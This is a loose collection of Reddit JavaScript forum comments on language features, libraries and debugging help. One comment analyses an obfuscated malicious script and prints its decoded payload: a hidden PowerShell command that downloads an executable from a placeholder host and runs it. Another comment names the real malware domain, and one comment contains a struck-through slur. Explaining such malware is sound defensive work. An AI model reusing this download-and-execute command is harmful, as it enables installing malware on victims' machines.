Yeah, this is kind of the conclusion I'm coming to. At this point, I think I'd end up putting so much effort into protecting the game that I wouldn't actually be writing the game itself. I'm not a huge fan of Java for the same reason, and languages like C# are very much platform dependent. This leaves 3rd party engines like Unity, but that's like using a bazooka to kill a fly in my case. 
Frankly, I'm in the camp that ES6 classes aren't the best idea. (It's probably a small camp, but I've heard the same opinion expressed elsewhere, so I know I'm not just a lone voice in the wilderness here) Particularly, I think they're a three-fold trap to newcomers to the language: 1. They abstract away the syntax of prototypical inheritance, but they're just sugar, and they don't actually free you from the necessity of actually understanding prototypical inheritance in order to understand what's actually going on, or to deal with some more complex situations. 2. They encourage trying to bring a very heavy OOP programming style to Javascript. (The "Java~~script~~" programming style) And I've never liked that style, and don't think it plays to the strengths of JS very well; it tends to produce more verbose code (more object definitions, unnecessary encapsulation, setters/getters, etc), certainly compared to a functional-style or even just compared to a more pragmatic mix of functional, imperative, and OOP style. 3. This is sort of an extension of point 2, but they encourage inheritance over composition, while it seems like popular opinion on best practice is moving strongly in the opposite direction. You can definitely avoid these pitfalls: it's entirely possible to write great idiomatic Javascript with composition using `class`, but the more widespread `class` is, the more newcomers are going to fall into those traps, and personally, I don't often find that the sugar is all that significant in the first place. In part, I'm just waiting to see where "best practice" ends up. TL;DR: don't feel like you *have* to use `class`. If you love the syntax, go for it, but you're not missing much if you choose not to use it.
I actually tried that, but it seems to still want to drag the whole page.. I can show you what I've replaced: var el = document.getElementById("id_name"); window.addEventListener('mousemove', function(e){ if(curDown === true){ window.scrollTo(el.scrollLeft + (curXPos - e.pageX), el.scrollTop + (curYPos - e.pageY)); } }); Everything else I left the same. Am I missing something? (Sorry if the formatting is bad. First time asking these questions on Reddit.) Edit: Forget Reddit formatting. Here is is on pastebin: http://pastebin.com/3vmvb2bz
ABP only saves memory if the burden from the blocked content outweighs the extension's own overhead, which may be the case for your site. However, uBlock Origin actually has even better blocking abilities (in particular, it can block WebSocket requests, which are often used by ad-providers to circumvent ABP, including on your site), and lower overhead than ABP. When I browse that page with uBlock Origin, I can load and scroll through it just fine.
I think the quotes around "script.js" are to blame. Did you copy this code from Word or something? They should be straight quotes but they seem to be the "curly quotes" [More info](https://support.office.com/en-us/article/Change-curly-quotes-to-straight-quotes-and-vice-versa-017963a0-bc5f-486b-9c9d-0ec511a8fb8f)
Don't use mutation events; use [`MutationObserver`](https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver)s instead, and consider using the [`Element#classList`](https://developer.mozilla.org/en-US/docs/Web/API/Element/classList) API instead of jQuery methods. I don't know your whole extension, but it looks like if you did that, and also used `document.querySelectorAll` and the `.addEventListener` method, you might remove your dependence on jQuery.
So, based on what you are saying... both basics[7] = ["Delta", "d2", "8", "Option 8", "h"]; basics[8] = ["Epsilon", "e1", "9", "Option 9", "i"]; basics[9] = ["Epsilon", "e2", "10", "Option 10", "j"]; are two different arrays? I was under the impression that the whole thing from var basics to , "j"]; was one big array.
This could probably help you :): http://codepen.io/Paulooze/pen/woJyYw?editors=0011
Best practice for scripts is the bottom of the page. If you add assets to the head section it blocks rendering of the page until it's loaded. Generally js isn't needed to display your page's content (or at least a first render of it with loading indicators) so you put it at the bottom so the page loads. However html5 introduced `async` attribute so you could add js to the head without blocking rendering: &lt;script src="code.js" async&gt;&lt;/script&gt;
http://stackoverflow.com/questions/15518328/creating-js-object-with-object-createnull I've never used or seen Object.create(null) in the wild though. (Not to say that people don't use it, just that I haven't seen it) ymmv
I guess the main reason why im trying to learn all of the components. is because I am going through my array... and googleing and when i search I see arrays that look more like var basics= ['Alpha', 'a1', 'Option 1', 'a']; and not like var basics = new Array(); basics[0] = ["Alpha", "a1", "1", "Option 1", "a"]; and I dont know how to change the first one to look like the second one with out breaking something
Well, it's been said that Javascript is Scheme in Java's clothing! And for the reasons why SICP is a great book, I can refer you to PG's comment on amazon: https://www.amazon.com/review/R3G05B1TQ5XGZP Personally, it's my favorite book and I often pick it up and read a few pages and I'm always mind blow at how succinct and interesting it is (I've read it cover to cover a while back but I like re-reading part of it from time to time). It's just crazy how much they can put in 2-3 pages. You get to build interpreters, compilers, SQL-like languages. It also enforces amazing great practices about how to think about solving problems. All in all, it's just an amazing book.
Hey there, thanks for sharing! I'm part of the team behind Forest and Lumber. Send me an email at vincent[at]forestadmin.com if you have an open source project you'd like to use us on, we can try to hook you up :)
Imagine you use some sort of "here/not here" computation with "{}" as a hash map. If someone asks your code: "Have you seen string X?" you would just do: var hashMap = {} function seen(stringX) { return stringX in hashMap } Unfortunately if someone wants to know if string `constructor` is in your hash map - the code will return true, even though it never saw it. If you run this code in Chrome, it will also tell that `__proto__` is in your hash. I spent good amount of time debugging a bug in graph library, just to find out that some node had `id === "construtor"` :). However if you have guarantees about input strings - there is no point in using `Object.create(null)`. Also with ES6, if you need to tell if something is present it's best to use `Set` object.
I've actually been meaning to go through this book for a long time. Would Racket work for this on Windows? I also have some limited Linux access with my Raspberry Pi if there is a version of Scheme that would work well on it.
Thanks for the insight. Always used {} without thinking.
The school princi**PAL** is your **PAL**!
Thanks!
Seen like a few times in very old code. People really don't do that very much anymore. (Or at all)
It's definitely overkill for small scripts. 
You do still have to be careful, though, since not everyone will respect that you created an object without a prototype. `co`, for example, does not appreciate you yielding an object created that way. 
Really? I find the advanced algorithms rather hard (that's actually where I am ATM), isn't it a better idea to practice with them first or should I just jump over them and do the Tic-Tac-Toe etc ? Thanks for advice!
I use it sometimes. Recently it makes more sense to just make a new Map, though. 
There's also [Map](https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Map)
How did you get your site to startup so quickly? Every site I've seen built with Aurelia has a loading screen it sits at for a couple seconds.
There is no requirement to use inheritance in this language. As a result I never use prototypes, `new`, `this`, or `Object.create()`. Why bother with all that extra ritual and convention when you don't have to? You can achieve reuse in far more simple ways.
You are completely right about this whole thing. Buttttt..... I'm probably still not going to do it lol. The main problem I see with this is there's so much code bundled in modern apps that come from third parties that are almost definitely not doing `Object.create(null)` that it would just be infinitely easier to not name things `hasOwnProperty` or whatever. `values` is actually a tricky one though, I hadn't thought of that. The minor problem is it's just much more annoying. It's so much easier to do `return { val1, val2 };` than let ret = Object.create(null); ret.val1 = val1; ret.val2 = val2; return ret; If I need that modicum of safety on edge cases, I'll use it. But 99% of the time I'm not going to worry about it. 
"Shoehorned StarWars References: The Talk"
http://codepen.io/jermhern/pen/eBdoKB?editors=0010 I am having an issue in turning a number into a string and compare them in JavaScript. Do you have any suggestions? I have attempted many of the expressions for comparing but I have used them incorrectly. 
As someone who uses a lot of modern frameworks (and loves them), this isn't really a scenario you need that for... React/Vue/etc all shine when it comes to large scale applications and code reusability/etc (e.g. they are great for work or joint-project environments). Also, virtual DOM is great when you have tons of elements you want to display that all have some kind of event/listener tied to it (or have state constantly changing that triggers another event/etc). If you are just rendering static HTML that holds static content and then at the end of it you are just running a function that calcs some data, then a modern framework would be overkill. You will spend a ton of time learning a modern framework than just spinning this project up in a node/ES6/webpack build. However, that may not be a bad thing if you want to both build a project and learn a new framework. Good luck :).
/u/blood_bender /u/dvlsg Yeah I think you're all right. We'll still need to check hasOwnProperty because who knows what third parties might send, and also you're right the syntax is very blah. This might be a language quirk we'll just have to live with. :-/
they can be used similarly as control flow over promises. Right, so is that just a better way of getting continuous responses as opposed to utilizing a callback?
Yep, exactly.
I did all the advanced ones that I could do somewhat easily, then I started the projects. Went back today and the algos are so much easier. I think starting with the projects after *trying* all the algos is a good start.
I'm pretty sure the ES6 classes aren't the best idea camp is larger than the camp of people who think it's good. Classes were added to javascript simply to make the documentation for modern javascript frameworks look more appealing to people who aren't used to programming without classes, AKA native application developers. 
[Can I animate this CSS property?](https://h3manth.com/is-animatable/) [Can I](https://animatable.now.sh/)?
I'm going to give a different opinion than nickgcattaneo. Although there is some learning curve to React/Redux or Vue / whatever, once you get the hang of it, it's very useful for even the smallest applications, and it doesn't require 1/4 of the boilerplate you typically see in large scale applications. A minimal redux setup can be 10 lines of code and you get all of the advantages of state management, and component reusability as any large scale app. I say go for it! Pick either one (both and vue and react are very good, you can't lose). Suck up the learning curve, ask a lot of questions and you'll zipping through in no time. Feel free to PM me if you choose React! Good luck :)
A must read for me. I love this book.
To go along with the answer... Interesting code there .. never seen that before. And would highly recommend not using it! :-P Also, [some documentation for Function from MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function). First stuff right up the top is the same use as OP, along with a full explanation per MDN style. ;-) 
&gt; I can't really figure out why I would use them, or in what cases they'd be preferable over constructors. They're the same thing. If your code would be clearer written using then `class` keyword, or you are working on a codebase that uses the `class` keyword already, do that. If it would be clearer with the old-style syntax, use that instead. I write a lot of React code, and the React community has broadly adopted the `class` keyword, so I mostly use the `class` keyword, and it's marginally more concise, and I like concise code, so whatever, it's fine. Really, it just doesn't matter. It's like the semicolon debate all over again. Or the emacs/vim/IDE/atom/sublime/VSCode/whatever wars. Or tabs versus spaces, or `let` versus `const`, or any of the other amazingly pointless things we love to hold extremely strong opinions on. &gt; no one really delves into why they're beneficial beyond philosophical OOP vs function programming arguments. Because, again, they're the same thing. There is no benefit to one over the other. Nor does the question even relate to any sort of deep OOP vs FP questions (neither syntax is in any way "functional), but because the underlying question is so pointless (which easily interchangeable style of implementing the same OOP concepts do you think is better?), people argue over that instead.
Have a look at fabric.js and its complementary library, darkroom.js.
I found a great use when I decided to try creating a visualization of quicksort. I was like "ok, I've implemented the function, now, I just, uh, need to pause it at every step in order to visualize it". With generators, it was very simple to transform my implementation in to one which could be stepped through. Not exactly a real-world example, but definitely the best solution to this problem I ran in to.
A public member can be accessed from outside the class, which for practical considerations means "potentially anywhere". If something goes wrong with a public field, the culprit can be anywhere, and so in order to track down the bug, you may have to look at quite a lot of code. A private member, by contrast, can only be accessed from inside the same class, so if something goes wrong with that, there is usually only one source file to look at. If you have a million lines of code in your project, but your classes are kept small, this can reduce your bug tracking effort by a factor of 1000. Another advantage is related to the concept of 'coupling'. A public member m of a class A that is used by another class B introduces a dependency: if you change m in A, you also have to check usages of m in B. Worse yet, nothing in class A tells you where m is being used, so again you have to search through the entire codebase; if it's a library you're writing, you even have to make sure code outside your project doesn't break because of your change. In practice, libraries tend to stick with their original method signatures as long as possible, no matter how painful, and then introduce a block of breaking changes with a major version update. With private members, by contrast, you can exclude dependencies right away - they can't be accessed from outside, so all dependencies are contained inside the class. In this context, "other programmers" include your future and past selves. Chances are you know now that you shouldn't do this thing X with your variable Y, but you're bound to have forgotten three months down the road when a customer urgently needs you to implement some feature, and you wonder why doing X breaks Y in obscure ways. So, as to when you should make things private: I'd say make everything private by default, and then expose only those parts that absolutely have to be public. The more you can make private, the better. Source: http://softwareengineering.stackexchange.com/questions/143736/why-do-we-need-private-variables
I heard good things about http://paperjs.org/ https://github.com/pixijs/pixi.js - is not lightweight, but has huge community and can be easy to start. https://two.js.org/ - is rendering agnostic. like /u/pagalvin suggested, http://fabricjs.com/ - I'd call it on "heavier" side. Finally, if you are going to render less than 4,000 elements - consider using SVG. It's easier to compose and can be a good option. &lt;shameless-plug&gt; Overall, if you know one popular library and want to find more, you can use my tool: http://www.yasiv.com/github/#/costars?q=ericdrowell%2FKineticJS - it shows what people "star" together. And that can sometimes give good hints. &lt;/shameless-plug&gt;
Yes, that's a good textbook answer on the value of information hiding. On the other hand, many languages do not enforce information hiding, and don't seem to suffer from it, and many of the ones which do enforce it offer ample ways to ignore it. I would counter that 95% of the advantages you list could also be gained simply by prefixing internal methods and fields with an underscore, and then *not using them*. If that's not enough, you're now in the realm of trying to design a language to stop people writing bad code *on purpose*, and I believe that it is neither desirable nor feasible.
I believe your issue might relate to duration. It should be a long which means it's probably getting cast from a double to a long of 0 when passed to .stop() which indicates to stop playing immediately. As a side note, your .stop() should indicate at what time to stop (with relation to ctx.currentTime + durationInSeconds).
Do you have specific concepts you need help understanding? I will not answer your homework for you, but can help understand concepts.
You're so close, you have two small problems. Problem the first: On this line you do not pass a second argument (options): window.setTimeout( () =&gt; snd2( audioCtx ), 2000 ); So the following line will *always be `0`*: let now = ctx.currentTime + options.delay || 0; ...because `number + undefined === NaN`. So quick fix: window.setTimeout( () =&gt; snd2( audioCtx, { delay: 0 } ), 2000 ); Problem the second: You're calling `osc.stop` passing `duration`.. but if `currentTime` is `2`, and duration is `1` then it will have stopped before it started. You need to add `now` together with `duration` similarly to how you're doing it in your linear ramp. oscNode.stop(now + duration); And voila! It works.
I was writing a brute force solver for a game -- a rather similar process to solving a Sudoku. However, I wanted to show the current progress on the screen. Not *every* iteration, but maybe 1 out of every 1,000 -- just to give some flickering feedback like it was trying. With regular JavaScript, the various nested loops locked up the browser. That's normal JavaScript for you... so there was no way to get the screen to actually update. The system just ... froze. Due to the nested loops, it would NOT have been easy to rewrite using callbacks Yea, I *could* have, but it would not have been pretty. I ended up writing it as a web-worker which posted a message to the main thread every 10 seconds to do a redraw, but that was very clunky. I am re-writing it with generators -- and that will be sweet. I can call one iteration of the loop and the generator function goes into a 'pause' mode until I call it again. I can update the screen when needed. I'm not locking up the entire browser. I'm running it in normal program space where debug tools actually work! (Though I'm told debug tools work better with web workers now, but still...) 
You are reassigning your variables UserChoice and ComputerChoice from a number to a name. For example: If ComputerChoice == 1 then ComputerChoice is now set to "rock" which can never equal "1" Your code is very difficult, why not just keep your Choices as numbers and check them in the giant if/else?
"2 weeks left". Wut?
Not everythig needs to be an NPM package, just do it the "old" way.
How are you going to gain 95% of the advantages by just using a coding "convention"? The reality is that you're not immortal, and you're only one person. Eventually, the majority of the code we write will be touched by someone else, and as soon as they make a mistake and use one of your "private"-ly marked variables in another class, it's all over. As far as having ample ways of "ignoring" information hiding, it's very easy to see when someone is designing bad code because they're using reflection to ignore it because it's incredibly roundabout. It's a little more difficult to find when someone just reassigns a value of a single variable, which just so happens to have an underscore. 
Two good options: 1) debounce your input events! https://lodash.com/docs/4.17.2#debounce 2) Create an observable stream of inputs that maps to ajax requests which only `takeUntil` a new input event is emitted, and `combineLatest` to only get the last emitted value http://reactivex.io/rxjs/class/es6/Observable.js~Observable.html#instance-method-combineLatest (this is more complex / feature rich, but you should still debounce with this approach! (using a stream debounce operator))
This is a pretty great example of "the programmer who blindly follows some pattern because somewhere he read that it is better to do it that way" vs the programmer who seeks to find out why it would be "better", what is the actual gain if any, and will it affect your program. I am going to venture to say that for your "beginner exercises" that "don't use the prototype yet", there will be no gain at all from using `Object.create(null)` over `{}` but the discussion of an object with no prototype chain being useful as a straight up hashmap are interesting, but not at the level you appear to be at. This comment is the most relevant in my opinion https://www.reddit.com/r/javascript/comments/5e62us/is_there_a_reason_to_create_an_object_without_a/daa4y7n/
Phaser.io
[Youtube channel](https://www.youtube.com/channel/UCKjVLbSDoM-8-eEM7A30igA), [blog](https://medium.com/@drboolean) and his [Github](https://github.com/DrBoolean) 
Wow, thank you for posting this. I've been casually learning FP for a while now, this is the first thing I've read that finally made the concepts break through.
I think I'm on board with private fields, but I have to admit I really don't like that syntax.
You never declared `FNaFEQC` if you want to retrieve or initialise a variable with the value returned or retrived from localstorage use something like this function InitialSetup(a, b) { var value = localStorage.getItem(a); if (value === null) { switch (b) { case "num": value = 0; break; case "equ": value = Array(66).fill(0); break; case "sta": value = Array(2).fill(0); break; default: value = Array(8).fill(0); } localStorage.setItem(a, value); return value; } return JSON.parse(value); } var FNaFEQC = InitialSetup('FNaFEQC','num'); document.getElementById('test').innerHTML = FNaFEQC;
It downloads (and opens) an exe file from dnodailynews . xyz
http://createjs.com/
I'll leave this here: // returns true for user win, returns false for cpu win, returns undefined for ties // Input Rock = 1, Paper = 2, Scissors = 3 function rps(cpu, user) { var n = cpu / user * 6; switch(n) { case 2: case 9: case 12: return true; case 3: case 4: case 18: return false; case 6: default: return undefined; } }
This one appears amenable to deobfuscation; it appears as if the variable `cXKvEMeJ` is a path to the registry hive `HKLM\soFtwAre\miCRosofT\WinDOwS Nt\cUrrEnTVersioN\systemrOot`, and then to get `JGWXrUoR`, it's asking the system to read from that registry hive, and get the character at some number and raise it to uppercase (I suspect this character is `N`). Then this character is used to make a new global regex, and `Paqoxmd` is stripped of that character to make a set of commands to basically `eval` (although this code uses the `Function` constructor to do that). The code being evaluated appears to be hdEJzSs.ShellExecute("CMD.ExE", "/c ping localhost &amp; powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile (\'hxxp://dangerous.example/malware.php\',\'%AppDatA%vxj12.exe\'); stArT-prOcess \'%APpdatA%vxj12.EXe\'", "", "open", 0); If my suspicions are correct, this downloads a harmful executable file to a known location and then executes it. (I have censored the actual URL, but you can figure it out from the screenshot.) --- I'm not even a pro at deobfuscation like this, so whoever packaged this exploit needs to try harder.
 console.log({e: jquery(...)}) Also, stop using jquery for element selectors in the console. It won't work if the site doesn't use jquery. console.log({e: document.querySelector("#my-elem")}) You can also use querySelectorAll if you know there's more than one element, or don't know how many there are. The reason why this works is Chrome's console assumes you want to see the element's html when you log the element. When you wrap it in an object it has to apply the html Dom object to the primitive object. However, that's just my interpretation. There's probably a more specific reason but it's late and I'm on my phone.
Thanks so much! Really interesting. Appreciate the work :)
The school computer was a PC. First I've seen of it. Interestingly, it was sent to my address using my student number, but it was also sent to the same student number of a nearby school. Who knows if it exists or not.
Thank you! THat worked. Could you please explain me whwat this "=== - 1" means? best regards
They probably want control over it. They don't want people hosting their own versions.
&gt; it is not widly supported yet Depends on how you define "widely." About 2/3 of internet users' browsers support Proxy, according to caniuse. That's certainly not great, but it is a supermajority.
Read [this article](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/if...else). After that, I'm pretty sure that you will understand what went wrong with your code.
I'm wondering, how you can call foo() now. foo('a', 'b', 'return a + b') // -&gt; VM459:3 Uncaught ReferenceError: arg1 is not defined(…) (new Function('a', 'b', 'return a + b'))(1, 2) // -&gt; 3
It’s not much (a chapter in my book), but I’m not aware of anything better: http://speakingjs.com/es5/ch14.html
Hey vinzghyz, I do have a few! Thanks for the offer, I'll reach you out.
https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_objects/Object/values
cool. thank you
oh ok, that's not in anyones browser yet. It's not even in the spec yet. Kinda weird to choose it over all of the other props that are on Object's prototype already. Especially when you're explaining it to a beginner.
Didn't it ever happen that the StuffInThing needs to be used in many Things?
~~`$` is *always* the console bound `document.querySelector`. jQuery doesn't overwrite it. When in the console you must explicitly call `jQuery()` to select things using jQuery. This is a part of the console api code that is implemented in C in the browser engine itself and can't be overwritten in user-land.~~ EDIT: Ignore this. I didn't realize moving the console API into v8 internally kept the overriding in place. I understood when the initial move happened that the console API couldn't get overridden anymore in Chrome. This however was a mistake or a bug that has since been addressed.
I think he choose it because `values` is a common name. Also Object.values is already part of the spec! ES2017 to be exact: https://github.com/tc39/proposal-object-values-entries
&gt;`$` is always the console bound `document.querySelector`. jQuery doesn't overwrite it. That would imply that jQuery is *never* accessible from `$` anymore, as console's `$` would be available instead. It'd basically act as if `.noConflict()` is always called. However this is not true at all. It's very easily tested too: create a new webpage, load in jQuery, and *don't* call `.noConflict()`. Now open the webpage in the browser, open the console, and enter `$`. You get the jQuery object, *not* console's $. So yea, $ is *not* always console's $. It behaves as if console sets $ before any JS on the page runs. Thus when loading jQuery, it'll overwrite $. When then calling `.noConflict()`, it'll reinstate $ as the console's $. **Edit:** Quickly googled up an example documentation page for the console-provided functions. [This one's from Apple](https://developer.apple.com/library/content/documentation/AppleApplications/Conceptual/Safari_Developer_Guide/Console/Console.html). Directly quoting the page: &gt;If your scripts share the same function name as a Command-Line API function, the function in your scripts takes precedence.
OMG, you are awesome! I digested this and made these two changes: let now = ctx.currentTime + (options.delay || 0); and oscNode.stop(now + duration); And it's perfect! I went back and reread the OscillatorNode docs and now I see that stop takes a parameter for specifying the exact time it should stop, not the duration. Thanks so much for taking the time to look at this, I was tearing my hair out! PS I love you
Oops, this is why you don't code sleep deprived.
Interesting feature, but I'm a bit unsure as to its usefullness. The documentation is a bit shallow. Do I understand it properly in that it merely set XHR's readyState to 0, which effectively makes it ignore the XHR's result when the request returns? If so, that's essentially the most direct answer to OP's question, that's for sure. However I personally would consider it an incomplete solution, since it'll still be sending over all these unnecessary requests. My personal approach for an input to support live interaction via AJAX (such as a live search box), would be to take this type of solution (or any higher level alternatives when they're available, like several methods mentioned in thsi thread), and then combine this solution with a very simple delay between user input and sending the AJAX request. Something simple like 400, maybe up to 500 ms delay before sending the AJAX request would do. How I got to this delay: Google gave me average typing speeds of 190-200 characters per minute, which would be just over 3 per second. This would produce a delay between key inputs of about .3s. To make the AJAX delay effective, it should be just a bit larger than the average delay between two characters when typing. Ofcourse if the server you're talking to can handle all the potential extra load without problem, then this extra delay is not necessary at all since it'd only delay things. So if you do have such freedom with your server, by all means exclude the delay, though I'd think this case to be fairly unlikely.
&gt; Also Object.values is already part of the spec! ES2017 to be exact On MDN they list it as draft. Draft is not spec. Though I don't doubt it will get into the spec.
Thank you all for the responses. I work with sites that have jquery for sure and it's been a problem with printing recently. I am tied to jquery versions that a customer site implements, but it's something that's affected my workflow in the last month now. Others at work have mentioned it too.We couldn't find the issue online.
Tip: open the console in the browser developer tools to see the errors that are occurring in the JS Something in your `styles` is malformed (stray bracket or a comma in the wrong place?) Edit: once you've fixed that also click on the gear icon next to "Javascript" and change the load type to "No wrap in &lt;body&gt;"
In short, it's like a more complicated way of using `eval` to execute some code from string form. As such this type of structure should generally be avoided.
My thought is no, it would fundamentally change the object if it copied over the prototype. But should be be easy to test. 
If you execute this code in the Chrome console you will see that when doing Object.Assign, it bases the resultant object prototype off the first param.
Just skimmed it. It seems they're just replacing HTML terms with JavaScript objects? `a` -&gt; `Link`?
It's most likely written this way to avoid being automatically picked up by AV rather than to really resist manual analysis. 
Cool. That would have been easier to type on my phone too.
You don't have to install xcode. You also don't need an apple developer account unless you are publishing to the itunes store. * xcode-select --install That will prompt for Command Line Tools. It's about 130MB. 
still it is not in the current JS spec. By "spec" I meant published specification, not upcoming.
Windows will (or at least would) try to run javascript files as local applications. The idea was to give developers an easy way to make small applications. You have to run the js file from the finder for it to work. The most famous one actually used VBScript (early Microsoft JS alternative that only ever worked in IE). https://en.wikipedia.org/wiki/ILOVEYOU
So slow. In my workspace at real work, we used intellij with java, tomcat, maven, and there was a memory leak somewhere. Had to restart intellij every day when it reached 2+GB of ram. At home, running my smaller node apps it is fantastic, no leakes, runs great! I am trying VS Code as of this week; love that it is lightweight and the extensions are where it shines. Can bring in intelli-j's keybindings (awesome feature) and a ton of other cool things, but still doesn't have robustness that webstorm/intellij has (example: HTML file, I can command+click on a class, and it will open up the SCSS file where that class rule is)
&gt;I'm not even a pro at deobfuscation like this Give yourself some credit. You deobfuscated from a friggin' *screenshot*. How long did it take you to transcribe that correctly? OP needs to learn how ~~not to be a faggot~~ to use Gist.
Yea that's one of the reasons why I prefer it too. But I think for me the biggest reason is that it just reads a lot more logical. This syntax clearly shows that functions are first-class citizens: they are like another variable type. And as such they can be defined exactly just other variables can. In terms of the hoisting, the variable creation itself is still hoisted, but that's a trait from `var` itself. For that reason I'm also quite happy about `let` and `const`, which throw an error when trying to use the variable after creation, but before assignment. I'd actually already been intuitively preventing myself from writing such code.
They are keeping that convention from the `react-router` package. `&lt;a&gt;` is still a valid element but it doesn't naturally update the history object, rather it changes `window.location`, so `Link` is just a convenient wrapper for `history` based changes.
Am i the only one who feel like next.js is actually a step in the right direction ? It's basically react + router and server side rendering without config... It's what people asked for, a fully opinionated framework. 
Have a look at the code sample for an if statement in the corner. Carefully compare it with your own code, specifically the line starting with `if`, as that's where your syntax error originates from. Don't give up so easily either! You'll likely come across many more very similar mistakes, everyone does, whether new or seasoned programmers. It helps a lot if you get used to these types of mistakes though, so that over time you'll learn to identify the problem sooner, and even prevent it most of the time. It'll all get better, you just need to keep up the practice.
It's been a long time since I've been on Windows. Is/was there an warning message before executing a JS file? Or is it when there is a call to ActiveX? Is it still allowed? 
Since you are asking about the big picture of the project, you won't get a lot of useful help here. You would have better luck just using Google and self researching. People may be able to recommend chart libraries and all, but that is probably about the extent.
For future reference, this tool is pretty slick untangling javascript. http://www.relentless-coding.com/projects/jsdetox/
How does a .js file make registry changes?
But an AV scanner will have a harder time of it. 
[Windows Scripting Host](https://en.wikipedia.org/wiki/Windows_Script_Host) From back when the web was going to obsolete operating systems... the first time.
You're right that `getMonth()` is 0-based but `getDate()` isn't. So this will only display Yes on 24th Dec.
To answer my own question, I just tried it and no warning at all. I even tried with ActiveX and no warning too. I did my tests on Windows 7. However, there would probably be a warning if the file comes from Internet. But, since, in our case here, the file was in a rar archive, it would probably have a free pass.
Not viewable on mobile (iPhone). The sidebar with the chapters is not accessible, so you can't get past the intro page.
Exactly how would I do that? I would really appreciate if you could give me an example! I've found this code that somewhat works: &lt;script&gt; $(window).keydown(function(event){ document.getElementById('centerBox').innerHTML='&lt;p&gt;Hello world&lt;/p&gt;' }); &lt;/script&gt; I need it to only trigger on the "enter" key though, and I also need it to repeat every time I press the key. The above code only works once.
&gt; console.log(expensiveOperation('values')) // [Function: values] This one actually outputs `VALUES`
They aren't just "as good and as bad as constructor functions", they literally _are_ constructor functions: class Foo { } typeof Foo; //=&gt; "function" 
"Next.js may not cure JS Fatigue, but it allows us to build web apps in JavaScript as we write websites using PHP." Somehow it doesn't make me want to learn more.
Well.. NodeJS 
That would require NodeJS to be installed.
Original author here. Less code is not always better. Dumb verbose code can a lot easier to read and understand than smart code like this, that contains quite some implicit knowledge and assumptions: the `name` → `state.form[name]` mapping and bubbling. Hey, variable number of input and such. Supporting checkboxes/radios will also add to the smarty pants by introducing another check, making `handleChange` noisier and harder to understand. Furthermore, components in the form can be be something other than classic inputs. It can be a custom tag entry component, which will provide an array of strings to `onChange` and will not bubble to the form element because, well, it's entirely custom. This might introduce a discrepancy in that some inputs are taken care of, magically, and others are still handled manually. Not being uniform inside even one component is asking for trouble. All in all, I find it better to be just a bit more verbose, but stay uniform, predictable, and magic-less.
Yeah. Of course :) it'd be a pretty ineffective virus if it only targeted Windows users with node installed. 
term3
Hey, I didn't but I will do. Thanks for the link!
Sure you could use a good old for loop as well. `.forEach` was a bit more concise here. There's supposed to be some sort of performance difference, but you could call that premature optimization. ;) I think in practice it mostly comes down to personal preference, and both methods are fine to use. Other than that, glad my suggestion's been useful for others!
Yes, a generator function can be non-blocking... That's how they are used for async coding. In fact, Babel and Typescript can translate `await/async` code into generator functions and be ES5 compatible.
The new-line style is referred to as Allman style. And the issue you refer to regarding return values is no big deal; JavaScript is an imperfect language. Again, I prefer the clarity and whitespace of Allman style rather than having everything scrunched to the top of a function. I'm certainly not going to sacrifice clarity of an entire project for a JavaScript idiosyncrasy that if you've been programming a certain length of time you know to avoid or mitigate for (I generally don't return Object literals inline anyway) via either code style or predeclaring - no matter what Crockford advocates. In my current freelance gig I have to lint to Standard JS style (2-spaces, cuddled everything) and I'm not fan at all, but I do it, as it's what the project is set up as. This being a personal project, and something I spend a LOT of my free time on, I choose a style that I actually LIKE to work with :D 
Considering most of us were able to figure out the trick rather quickly, how hard would it be to add this kind of functionality to an AV scanner? My guess is that checking for obfuscated file paths in strings would increase the running time, so I don't know how feasible this would be. The human brain is pretty good at picking out words from text like "sXoXFXtWXaXrXe," but I imagine adding functions that check for this would add tons of overhead.
I wrote hyperlist and it has a callback with an index and you return the dom node at that position. https://github.com/tbranyen/hyperlist Maybe give this a try?
&gt; Dumb verbose code can a lot easier to read and understand than smart code like this, that contains quite some implicit knowledge and assumptions: the name → state.form[name] mapping and bubbling That's nothing an inline comment can't fix. I like the above approach because it prevents bugs that would be caused by copy-pasting when adding a new field. I agree it can't work in all cases though.
That is completely incorrect. Open your console on this page, type `$`, hit enter, and what do you see? This is what I get: &gt; $ function (e,t){return new jQuery.fn.init(e,t)} It's quite obvious that `$` is indeed jQuery.
I don't know why, but your comment made me chuckle probably more than it should have.
Hi /u/unohowdashigo, this post was removed. Please ask specific questions.
Good catch, thanks.
These are very common attacks. The coolest one I've seen so far used VBScript to unpack a massive array of bytes to build an executable. It was way cooler than the drive by downloads scripts of today.
domvm's router does both client-side routing and href generation and can be used independently of any framework [1] [2]. It's getting some API refinement for 2.x, but the core features will stay. [1] https://github.com/leeoniya/domvm/tree/1.x-dev#route-module [2] https://github.com/leeoniya/domvm/blob/1.x-dev/src/route.js
A lot of the power of vim comes from plugins that you use with it as well as the ability to customize it's behavior with vimscript. I use vim plugins everywhere, but there's no replacement for the real thing.
Correctness comes before execution speed. With your function: const a = {value:23} const b = {value:18} filterDistinct([a,a,b,b,a,b]) // returns: // ["[object Object]"] Compare with: Array.from(new Set([a,a,b,b,a,b])) // returns: // [{value: 23}, {value: 18}] Not needing objects? Let's try with numbers: filterDistinct([10,20,10,20,30,10,20]) // returns the wrong types // ["10", "20", "30"] Compare with: Array.from( new Set([10,20,10,20,30,10,20])) // returns the right types // [10, 20, 30] Yours probably gives the wrong answer faster.
&gt; vim I live in vim+tmux for all development stuff after a lifetime in Visual Studio .NET. I will use VS Code for debugging on some rare occassions.
Yeah it's not great, but neither is anything else. I kinda wish I'd used `cycle.js` instead of `redux` with react. What did you use with react? I really want to like Ember more but some things are moving too slowly there and other things are moving wrongly.
